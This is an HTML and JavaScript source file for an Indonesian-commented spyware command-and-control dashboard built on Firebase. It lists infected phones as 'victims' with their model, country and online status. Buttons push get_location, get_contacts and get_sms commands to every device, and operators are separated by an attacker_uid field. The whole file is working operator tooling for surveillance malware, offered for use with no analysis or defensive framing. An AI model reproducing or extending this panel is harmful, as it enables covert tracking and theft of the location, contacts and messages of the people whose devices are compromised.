<!DOCTYPE html>
<html>
<head>
    <title>REU Panel - Dashboard</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="firebase-config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #f5f5f5;
        }
        .navbar {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 15px 30px;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .nav-links a {
            color: white;
            text-decoration: none;
            margin-left: 20px;
            padding: 5px 10px;
            border-radius: 5px;
        }
        .nav-links a:hover { background: rgba(255,255,255,0.2); }
        .container {
            padding: 30px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
        }
        .card {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .card h3 {
            color: #333;
            margin-bottom: 15px;
            border-bottom: 2px solid #667eea;
            padding-bottom: 10px;
        }
        .stat-number {
            font-size: 36px;
            font-weight: bold;
            color: #667eea;
        }
        .victim-item {
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .victim-item:hover {
            background: #f0f0f0;
            transform: translateX(5px);
        }
        .online { color: green; font-weight: bold; }
        .offline { color: gray; }
    </style>
</head>
<body>
    <div class="navbar">
        <h2>🕵️ REU Monitoring Panel</h2>
        <div class="nav-links">
            <a href="dashboard.html">Dashboard</a>
            <a href="profile.html">Profile</a>
            <a href="#" onclick="logout()">Logout</a>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <h3>📊 Statistics</h3>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                <div>
                    <div class="stat-number" id="totalVictims">0</div>
                    <div>Total Victims</div>
                </div>
                <div>
                    <div class="stat-number" id="onlineNow">0</div>
                    <div>Online Now</div>
                </div>
            </div>
        </div>

        <div class="card">
            <h3>🎯 Your Victims</h3>
            <div id="victimsList"></div>
        </div>

        <div class="card">
            <h3>📡 Quick Actions</h3>
            <button onclick="sendCommandToAll('get_location')" style="width:100%; margin-bottom:10px;">📍 Get All Locations</button>
            <button onclick="sendCommandToAll('get_contacts')" style="width:100%; margin-bottom:10px;">👥 Get All Contacts</button>
            <button onclick="sendCommandToAll('get_sms')" style="width:100%;">💬 Get All SMS</button>
        </div>
    </div>

    <script>
        let userDevicesRef;
        
        auth.onAuthStateChanged(async (user) => {
            if (!user) {
                window.location.href = 'index.html';
                return;
            }
            currentUser = user;
            
            // Get owner UID
            const ownerSnap = await db.ref('settings/owner_uid').once('value');
            ownerUid = ownerSnap.val();
            
            // Load victims
            loadVictims();
        });

        function loadVictims() {
            let victimsRef;
            if (currentUser.uid === ownerUid) {
                // Owner lihat semua devices
                victimsRef = db.ref('devices');
            } else {
                // User biasa lihat devices dengan attacker_uid = uid mereka
                victimsRef = db.ref('devices').orderByChild('attacker_uid').equalTo(currentUser.uid);
            }
            
            victimsRef.on('value', (snapshot) => {
                const victims = snapshot.val() || {};
                const victimsList = document.getElementById('victimsList');
                const totalVictims = Object.keys(victims).length;
                document.getElementById('totalVictims').innerText = totalVictims;
                
                let online = 0;
                let html = '';
                
                for (let [deviceId, data] of Object.entries(victims)) {
                    const isOnline = data.last_seen && (Date.now() - data.last_seen < 300000);
                    if (isOnline) online++;
                    
                    html += `
                        <div class="victim-item" onclick="viewVictim('${deviceId}')">
                            <div style="display: flex; justify-content: space-between;">
                                <strong>${data.device_name || 'Unknown Device'}</strong>
                                <span class="${isOnline ? 'online' : 'offline'}">${isOnline ? '● Online' : '○ Offline'}</span>
                            </div>
                            <div style="font-size: 12px; color: #666; margin-top: 5px;">
                                ${data.model || 'Unknown Model'} • ${data.country || 'Unknown'}
                            </div>
                            <div style="font-size: 11px; color: #999; margin-top: 3px;">
                                Last seen: ${data.last_seen ? new Date(data.last_seen).toLocaleString() : 'Never'}
                            </div>
                        </div>
                    `;
                }
                
                document.getElementById('onlineNow').innerText = online;
                victimsList.innerHTML = html || '<p>No victims yet</p>';
            });
        }

        function viewVictim(deviceId) {
            window.location.href = `victim-detail.html?id=${deviceId}`;
        }

        function sendCommandToAll(type) {
            if (!confirm(`Send ${type} command to all victims?`)) return;
            
            db.ref('devices').once('value', (snapshot) => {
                const victims = snapshot.val() || {};
                for (let deviceId of Object.keys(victims)) {
                    db.ref(`commands/${deviceId}`).push({
                        type: type,
                        timestamp: firebase.database.ServerValue.TIMESTAMP,
                        status: 'pending'
                    });
                }
                alert('Commands sent!');
            });
        }

        function logout() {
            auth.signOut().then(() => {
                window.location.href = 'index.html';
            });
        }
    </script>
</body>
</html>
